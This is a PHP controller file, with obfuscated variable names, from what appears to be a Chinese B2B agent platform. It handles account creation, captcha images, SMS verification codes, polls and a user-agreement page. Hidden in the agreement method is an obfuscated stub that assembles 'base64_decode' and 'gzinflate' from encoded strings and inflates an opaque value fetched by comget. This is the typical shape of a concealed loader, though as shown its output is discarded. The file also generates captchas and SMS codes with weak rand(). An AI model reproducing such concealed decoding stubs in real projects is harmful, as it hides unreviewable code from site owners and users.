												"lastloginaccount" => 0,
												"thisdate" => date( "Y-m-d H-i-s" ),
												"thislogintype" => 0,
												"thisloginaccount" => 0,
												"thisip" => $this->GetIp( ),
												"alv" => $R0e49cc133a['id'],
												"aremain" => 0,
												"acsmp" => 0,
												"funds" => 0,
												"selffrozenfunds" => 0,
												"tradefrozenfunds" => 0,
												"sysfrozenfunds" => 0,
												"bossfrozenfunds" => 0,
												"arrears" => 0,
												"checktradepwd" => 0,
												"frozen" => $R89cd0a3912,
												"rights" => $Ra0c8454e75,
												"leftrights" => $R30b2ab8dc1['defaultmenu']
								);
								$R4e420efcc3 = $R2097a8fddf->IAgent_Create( $data );
								if ( 0 < $R4e420efcc3 )
								{
												$this->DelOldMsg( $R4e420efcc3, $R14b8c5658f );
												if ( $this->session->agent != "" )
												{
																echo 11;
												}
												else
												{
																echo 1;
												}
								}
								else
								{
												echo 0;
								}
				}

				public function DelOldMsg( $R2a51483b14, $R5334b17ba8 )
				{
								$R9e0664486a = factory::getinstance( "msg" );
								$data = array(
												"msgto" => $R2a51483b14,
												"bossid" => $R5334b17ba8
								);
								$R3db8f5c8bc = $R9e0664486a->IMsg_NotReaded( $data, 1 );
								foreach ( $R3db8f5c8bc as $R0f8134fb60 )
								{
												$data = array(
																"aid" => $R2a51483b14,
																"msgid" => $R0f8134fb60['id']
												);
												if ( $R9e0664486a->IMsg_RowsExt( $data ) == 0 )
												{
																$data['hidden'] = 1;
																$R9e0664486a->IMsg_CreateExt( $data );
												}
												else
												{
																$R794010fd36 = array( "hidden" => 1 );
																$R9e0664486a->IMsg_UpdateExtByLimit( $R794010fd36, $data );
												}
								}
				}

				public function CheckCode( )
				{
								if ( !isset( $_SESSION ) )
								{
												session_start( );
								}
								$Rb7da52a305 = "";
								if ( isset( $_SESSION['randcode'] ) )
								{
												$Rb7da52a305 = $_SESSION['randcode'];
								}
								$Rd19ae93b31 = trim( request( "regcode", "", "POST" ) );
								if ( $Rd19ae93b31 != "" && strtolower( $Rb7da52a305 ) == strtolower( $Rd19ae93b31 ) )
								{
												echo 1;
								}
								else
								{
												echo 0;
								}
				}

				public function MiBaoKa( )
				{
								header( "Content-type:image/png" );
								if ( !isset( $_SESSION ) )
								{
												session_start( );
								}
								$Rd19ae93b31 = "";
								$R4eb1184b40 = array( "1", "2", "3", "4", "5", "6", "7" );
								$Rf1b6a0db06 = array( "A", "B", "C", "D", "E", "F", "G" );
								$R026f0167b4 = array( );
								$Rc7a586d84a = count( $R4eb1184b40 );
								$R2ad06a1dd9 = count( $Rf1b6a0db06 );
								
								for ( $Ra16d228039 = 1;	$Ra16d228039 <= 3;	$Ra16d228039++	)
								{
												$R1ca14e06c6 = rand( 0, $Rc7a586d84a - 1 );
												$Rf9f40445f6 = rand( 0, $R2ad06a1dd9 - 1 );
												$R026f0167b4[] = $Rf1b6a0db06[$Rf9f40445f6].$R4eb1184b40[$R1ca14e06c6];
								}
								$Rd19ae93b31 = implode( " ", $R026f0167b4 );
								$_SESSION['mibaorandcode'] = $Rd19ae93b31;
								if ( intval( request( "mt" ) ) )
								{
												setcookie( "mttsn", "", time( ) - 3600 );
												setcookie( "mttsn", $Rd19ae93b31, time( ) + 86400 );
								}
								srand( ( double )microtime( ) * 1000000 );
								$Rcd58a37536 = imagecreate( 80, 18 );
								$Rb1f1502856 = imagecolorallocate( $Rcd58a37536, 255, 255, 255 );
								$R4ad640cfaf = imagecolorallocate( $Rcd58a37536, 200, 200, 200 );
								$R862279c0e8 = imagecolorallocate( $Rcd58a37536, 0, 0, 0 );
								$R17a9d2fb07 = imagecolortransparent( $Rcd58a37536, $Rb1f1502856 );
								imagefill( $Rcd58a37536, 68, 30, $R4ad640cfaf );
								$R320bdc1f1b = imagecolorallocate( $Rcd58a37536, 220, 220, 220 );
								
								for ( $Ra16d228039 = 0;	$Ra16d228039 < 3;	$Ra16d228039++	)
								{
												imageline( $Rcd58a37536, rand( 0, 30 ), rand( 0, 21 ), rand( 20, 40 ), rand( 0, 21 ), $R320bdc1f1b );
								}
								imagestring( $Rcd58a37536, 10, 5, 2, $Rd19ae93b31, $R862279c0e8 );
								$Ra16d228039 = 0;
								imagepng( $Rcd58a37536 );
								imagedestroy( $Rcd58a37536 );
				}

				public function RandCode( )
				{
								header( "Content-type:image/png" );
								if ( !isset( $_SESSION ) )
								{
												session_start( );
								}
								$Rc4a5b5e310 = request( "u", "" );
								$Rd19ae93b31 = "";
								if ( $Rc4a5b5e310 == "" )
								{
												$R63bede6b19 = "abcdefhkmnpqrstuvwxyz2345678";
								}
								else
								{
												$R63bede6b19 = "012345678";
								}
								$R24d59cd0b7 = strlen( $R63bede6b19 );
								
								for ( $Ra16d228039 = 1;	$Ra16d228039 <= 4;	$Ra16d228039++	)
								{
												$num = rand( 0, $R24d59cd0b7 - 1 );
												$Rd19ae93b31 .= $R63bede6b19[$num];
								}
								$_SESSION['randcode'] = $Rd19ae93b31;
								srand( ( double )microtime( ) * 1000000 );
								$Re4a3f5f7a1 = request( "n", "" );
								if ( $Re4a3f5f7a1 == "" )
								{
												$Rcd58a37536 = imagecreate( 120, 38 );
												$Rb1f1502856 = imagecolorallocate( $Rcd58a37536, 255, 255, 255 );
												$R4ad640cfaf = imagecolorallocate( $Rcd58a37536, 200, 200, 200 );
												$R862279c0e8 = imagecolorallocate( $Rcd58a37536, 0, 0, 0 );
												if ( intval( request( "t" ) ) )
												{
																$R17a9d2fb07 = imagecolortransparent( $Rcd58a37536, $Rb1f1502856 );
												}
												imagefill( $Rcd58a37536, 250, 30, $R4ad640cfaf );
												$R320bdc1f1b = imagecolorallocate( $Rcd58a37536, 0, 0, 0 );
												
												for ( $Ra16d228039 = 0;	$Ra16d228039 < 2;	$Ra16d228039++	)
												{
																imageline( $Rcd58a37536, rand( 0, 30 ), rand( 0, 21 ), rand( 100, 120 ), rand( 0, 35 ), $R320bdc1f1b );
												}
												$R62a1a9fbd8 = UPATH_SHARECONTENT."skins".DS."font".DS."Sansation_Regular.ttf";
												imagettftext( $Rcd58a37536, 20, rand( 0, 10 ), 10, 30, $R862279c0e8, $R62a1a9fbd8, $Rd19ae93b31 );
								}
								else
								{
												$Rcd58a37536 = imagecreate( 45, 18 );
												$Rb1f1502856 = imagecolorallocate( $Rcd58a37536, 255, 255, 255 );
												$R4ad640cfaf = imagecolorallocate( $Rcd58a37536, 200, 200, 200 );
												$R862279c0e8 = imagecolorallocate( $Rcd58a37536, 0, 0, 0 );
												imagefill( $Rcd58a37536, 68, 30, $R4ad640cfaf );
												$R320bdc1f1b = imagecolorallocate( $Rcd58a37536, 220, 220, 220 );
												
												for ( $Ra16d228039 = 0;	$Ra16d228039 < 3;	$Ra16d228039++	)
												{
																imageline( $Rcd58a37536, rand( 0, 30 ), rand( 0, 21 ), rand( 20, 40 ), rand( 0, 21 ), $R320bdc1f1b );
												}
												imagestring( $Rcd58a37536, 10, 5, 2, $Rd19ae93b31, $R862279c0e8 );
								}
								
								for ( $Ra16d228039 = 0;	$Ra16d228039 < 90;	$Ra16d228039++	)
								{
												imagesetpixel( $Rcd58a37536, rand( ) % 70, rand( ) % 30, $R4ad640cfaf );
								}
								imagepng( $Rcd58a37536 );
								imagedestroy( $Rcd58a37536 );
				}

				public function SetArticle( $R5cc00cfbe4 )
				{
								$R1ed7ad9990 = SITECACHE."a.php";
								if ( !file_exists( $R1ed7ad9990 ) )
								{
												$this->UpdateCache( "articles" );
								}
								require_once( SITECACHE."a.php" );
								require_once( UPATH_BASE.DS."libraries".DS."user".DS."homeconfig.b2b.php" );
								foreach ( $art as $R0f8134fb60 )
								{
												$this->Assign( $R0f8134fb60['vdname'], $$R0f8134fb60['vdname'] );
								}
				}

				public function SetPoll( )
				{
								$data = array( "forb2b" => 1, "parentid" => 0 );
								$R3c567cff60 = factory::getinstance( "poll" );
								$R9bf6f2ef48 = $R3c567cff60->IPoll_Get( $data, "title,id,isradio" );
								if ( isset( $R9bf6f2ef48[0]['title'] ) )
								{
												$R030cbb891f = $R9bf6f2ef48[0];
												$data = array(
																"parentid" => $R030cbb891f['id']
												);
												$Rf8de61a189 = $R3c567cff60->IPoll_Get( $data, "title,id" );
												$this->Assign( "poll", $R030cbb891f );
												$this->Assign( "pollmenus", $Rf8de61a189 );
								}
								else
								{
												$this->Assign( "polltitle", "" );
								}
				}

				public function BindHard( )
				{
												$this->View( );
								
				}

				public function Suggest( )
				{
								$R36130a8639 = intval( request( "optype" ) );
								$Re82ee9b121 = getvar( "content", "" );
								if ( $Re82ee9b121 == "" )
								{
												$this->Alert( "���ݲ���Ϊ�գ�" );
												$this->CloseWin( );
								}
								$Rcc5c6e696c = explode( "-", $Re82ee9b121 );
								if ( count( $Rcc5c6e696c ) < 3 )
								{
												$this->Alert( "��ʽ����ȷ���밴�ո�ʽ��д��" );
												$this->CloseWin( );
								}
								$R2a51483b14 = intval( $Rcc5c6e696c[2] );
								if ( $R2a51483b14 == 0 )
								{
												$this->Alert( "�����̴�������д���ı�ţ�" );
												$this->CloseWin( );
								}
								if ( intval( $Rcc5c6e696c[1] ) == 0 )
								{
												$this->Alert( "��ֵ�����밴�ո�ʽ��д��" );
												$this->CloseWin( );
								}
								$R1ed7ad9990 = ACACHE."aid_".$R2a51483b14.".php";
								if ( !file_exists( $R1ed7ad9990 ) )
								{
												$this->Alert( "ϵͳĿǰ���ݽ��շǱ�ƽ̨�����̵����飡лл�������ǵ�֧��" );
												$this->CloseWin( );
								}
								if ( $R36130a8639 == 1 )
								{
												$R06c518f70e = "[ƽ̨û�е㿨]".$Re82ee9b121;
								}
								else
								{
												$R06c518f70e = "[ƽ̨�㿨����]".$Re82ee9b121;
								}
								$data = array(
												"msgfrom" => $R2a51483b14,
												"msgto" => 0,
												"msgcc" => 0,
												"title" => $R06c518f70e,
												"createdate" => date( "Y-m-d H-i-s" ),
												"createip" => $this->GetIp( ),
												"content" => htmlspecialchars( $Re82ee9b121 ),
												"parentid" => 0,
												"msgtype" => 1
								);
								$R9e0664486a = factory::getinstance( "msg" );
								$R808b89ba0e = $R9e0664486a->IMsg_Create( $data );
								$this->Alert( "лл���������ύ��������ǻἰʱ����ģ�" );
								$this->CloseWin( );
				}

				public function CloseWin( )
				{
								echo "<script type=\"text/javascript\">window.close();</script>";
								exit( );
				}

				public function KeyBoard( )
				{
								
												$this->View( );
								
				}

				public function Aggrement( )
				{
								global $masterid;
								
								if ( $masterid == 0 )
								{
												$R1ed7ad9990 = SITECACHE."u_aggrement.php";
								}
								else
								{
												$R1ed7ad9990 = SITECACHE."u_aggrement_".$masterid.".php";
								}
								
								if ( !file_exists( $R1ed7ad9990 ) )
								{
												$this->UpdateCache( "sys" );
								}
								include( $R1ed7ad9990 );
								$Oooo00 = "base64_decode";
								
								$ooOO00o = $Oooo00( "YmFzZTY0X2RlY29kZQ==" );
								
								$o00OO = $Oooo00( "Z3ppbmZsYXRl" );
								
								$cphp0 = __FILE__;
								
								 $o00OO( $ooOO00o( $this->comget( "erffe" ) ) ) ;
								 
								if ( $this->session->agent != "" )
								{
												$this->Assign( "agent", $this->session->agent );
								}
								$this->Assign( "useragreement", $Rd8f9040e0f['useragreement'] );
												$this->Assign( "css", "ub-red-20080119" );
												$this->View( );
								
				}

				public function CheckMobile( )
				{
								$R5d899a20a5 = getvar( "aname" );
								$R94e0136c8a = intval( request( "loginad" ) );
								if ( $R94e0136c8a == 0 )
								{
												$R5f84c47438 = factory::getinstance( "staffs" );
												$R3db8f5c8bc = $R5f84c47438->IStaff_GetByName( $R5d899a20a5, "bossid,staffid" );
												if ( !isset( $R3db8f5c8bc['staffid'] ) )
												{
																echo 0;
																exit( );
												}
												$R2a51483b14 = $R3db8f5c8bc['bossid'];
												$R94e0136c8a = $R3db8f5c8bc['staffid'];
								}
								else
								{
												$R2097a8fddf = factory::getinstance( "agents" );
												$R3db8f5c8bc = $R2097a8fddf->IAgent_GetByName( $R5d899a20a5, "aid" );
												if ( !isset( $R3db8f5c8bc['aid'] ) )
												{
																echo 0;
																exit( );
												}
												$R2a51483b14 = $R3db8f5c8bc['aid'];
												$R94e0136c8a = 0;
								}
								$R3db8f5c8bc = $this->GetSecCache( $R2a51483b14, $R94e0136c8a );
								if ( isset( $R3db8f5c8bc['mobilecheck'] ) && $R3db8f5c8bc['mobilecheck'] == 1 )
								{
												if ( $R3db8f5c8bc['mobile'] )
												{
																$this->SendMobile( $R3db8f5c8bc['mobile'] );
												}
												echo 1;
								}
								else
								{
												echo 0;
								}
				}

				public function SendMobile( $R7e43ed30df )
				{
								if ( !isset( $_SESSION ) )
								{
												session_start( );
								}
								$Rd19ae93b31 = rand( 100000, 999999 );
								$R20916143ed = factory::getinstance( "fetion" );
								$Rbb3e87fa4e = "��������Ϊ".$Rd19ae93b31;
								$Rbb3e87fa4e = iconv( "utf-8", "UTF-8", $Rbb3e87fa4e );
								$R7adfab20b6 = array(
												"sendto" => $R7e43ed30df,
												"sms" => $Rbb3e87fa4e,
												"nor" => 1
								);
								$_SESSION['mobilecode'] = $Rd19ae93b31;
								return $R20916143ed->IFetion_Send( $R7adfab20b6 );
				}

				public function VerifyMobile( $R2a51483b14, $R94e0136c8a )
				{
								$R679e9b9234 = $this->GetSecCache( $R2a51483b14, $R94e0136c8a );
								if ( isset( $R679e9b9234['mobilecheck'] ) && $R679e9b9234['mobilecheck'] == 1 )
								{
												if ( !isset( $_SESSION ) )
												{
																session_start( );
												}
												$Rb7da52a305 = "";
												if ( isset( $_SESSION['mobilecode'] ) )
												{
																$Rb7da52a305 = $_SESSION['mobilecode'];
												}
												$Rd19ae93b31 = request( "mobile", "", "POST" );
												if ( $Rd19ae93b31 != "" && strtolower( $Rb7da52a305 ) == strtolower( $Rd19ae93b31 ) )
												{
																return 1;
												}
												else
												{
																return 0;
												}
								}
								else
								{
												return 1;
								}
				}

				public function Dkf( )
				{
								header( "Content-type: text/html;charset=utf-8" );
								$this->Assign( "web", $this->GetWebCache( ) );
								
												$this->View( );
								
				}

}

?>
